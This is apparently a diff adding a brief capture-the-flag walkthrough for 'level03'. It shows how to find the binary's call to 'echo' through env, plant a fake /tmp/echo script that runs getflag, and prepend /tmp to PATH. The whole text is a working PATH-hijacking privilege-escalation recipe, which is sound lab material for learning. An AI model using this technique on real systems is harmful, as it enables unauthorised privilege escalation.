@@ -1,0 +1,18 @@
+In your home, you get a level03
+
+See data section with:
+objdump -S -j .rodata level03
+
+result:
+
+..../usr/bin/env
+echo Exploit me
+
+create a echo script in /tmp:
+#!/bin/bash
+/bin/getflag
+
+chmod +x /tmp/echo
+replace PATH to point to /tmp:
+export PATH=/tmp:$PATH
+./level03 should write the flag in the terminal
